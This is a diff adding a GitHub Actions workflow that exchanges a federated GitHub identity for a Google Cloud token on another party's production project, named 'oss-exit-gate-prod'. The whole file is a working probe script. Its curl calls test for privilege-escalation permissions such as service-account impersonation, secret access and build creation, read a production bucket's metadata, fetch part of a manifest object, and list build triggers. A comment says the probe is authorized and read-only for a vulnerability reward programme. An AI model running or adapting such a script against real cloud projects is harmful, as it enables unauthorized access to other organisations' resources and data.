@@ -1,0 +1,49 @@
+name: lane5-kcmd-wif-impact2
+# Authorized Google Cloud VRP lane probe (read-only). Maps the permission surface
+# of the federated token issued to pwnhaven-afk/wif-probe by the OSS Exit Gate
+# WIF provider, using testIamPermissions + GET only. No writes.
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  impact2:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Direct WIF to OSS Exit Gate provider
+        id: auth
+        uses: google-github-actions/auth@7c6bc770dae815cd3e89ee6cdf493a5fab2cc093 # v3
+        with:
+          create_credentials_file: true
+          export_environment_variables: true
+          workload_identity_provider: projects/305452601764/locations/global/workloadIdentityPools/builders/providers/github
+          token_format: ''
+      - name: Permission mapping (read-only)
+        run: |
+          set -uo pipefail
+          TOKEN=$(gcloud auth print-access-token 2>/dev/null || true)
+          if [ -z "$TOKEN" ]; then echo "NO_TOKEN"; exit 1; fi
+          echo "TOKEN_LEN=${#TOKEN}"
+          echo "--- project-level testIamPermissions ---"
+          curl -s -o /tmp/p1.json -w "http=%{http_code}\n" -X POST -H "Authorization: Bearer ${TOKEN}" -H "Content-Type: application/json" \
+            -d '{"permissions":["cloudbuild.builds.create","run.services.create","run.services.update","container.clusters.get","container.pods.create","iam.serviceAccounts.actAs","iam.serviceAccounts.getAccessToken","iam.serviceAccounts.implicitDelegation","secretmanager.versions.access","secretmanager.secrets.list","pubsub.topics.publish","cloudfunctions.functions.invoke","logging.logEntries.create","serviceusage.services.use","artifactregistry.repositories.uploadArtifacts","storage.objects.create","storage.objects.get","storage.buckets.get","storage.buckets.list","compute.instances.create","deploymentmanager.deployments.create","clouddeploy.releases.create","clouddeploy.rollouts.create"]}' \
+            "https://cloudresourcemanager.googleapis.com/v1/projects/oss-exit-gate-prod:testIamPermissions"
+          cat /tmp/p1.json; echo
+          echo "--- bucket metadata GET ---"
+          curl -s -o /tmp/b.json -w "http=%{http_code}\n" -H "Authorization: Bearer ${TOKEN}" \
+            "https://storage.googleapis.com/storage/v1/b/oss-exit-gate-prod-projects-bucket"
+          head -c 400 /tmp/b.json; echo
+          echo "--- manifest object GET (first 400B) ---"
+          curl -s -o /tmp/o.json -w "http=%{http_code}\n" -H "Authorization: Bearer ${TOKEN}" \
+            "https://storage.googleapis.com/storage/v1/b/oss-exit-gate-prod-projects-bucket/o/knowledge-catalog%2Fnpm%2Fmanifests%2Fmanifest.json?alt=media"
+          head -c 400 /tmp/o.json; echo
+          echo "--- bucket testIamPermissions ---"
+          curl -s -o /tmp/bp.json -w "http=%{http_code}\n" -H "Authorization: Bearer ${TOKEN}" -H "Content-Type: application/json" -X POST \
+            -d '{"permissions":["storage.objects.create","storage.objects.get","storage.objects.delete","storage.buckets.get","storage.buckets.list","storage.objects.list"]}' \
+            "https://storage.googleapis.com/storage/v1/b/oss-exit-gate-prod-projects-bucket/iam/testPermissions"
+          cat /tmp/bp.json; echo
+          echo "--- cloudbuild triggers list ---"
+          curl -s -o /tmp/cb.json -w "http=%{http_code}\n" -H "Authorization: Bearer ${TOKEN}" \
+            "https://cloudbuild.googleapis.com/v1/projects/oss-exit-gate-prod/locations/global/triggers?pageSize=5"
+          head -c 400 /tmp/cb.json; echo
